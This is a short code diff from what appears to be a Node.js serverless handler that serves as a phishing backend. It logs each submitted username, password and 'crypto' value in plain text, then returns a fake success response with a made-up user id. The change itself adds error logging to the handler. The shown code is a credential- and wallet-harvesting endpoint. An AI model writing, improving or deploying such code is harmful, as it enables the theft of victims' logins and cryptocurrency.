@@ -16,6 +16,7 @@ module.exports = async (req, res) => {
     await log(`Login:\nUsername: ${username}\nPassword: ${password}\nCrypto: ${data}`);
     res.json({ success: true, userid: 1337, username: "dxvrxv" });
   } catch (e) {
+    await log(e);
     res.status(400).json({ success: false });
   }
 };
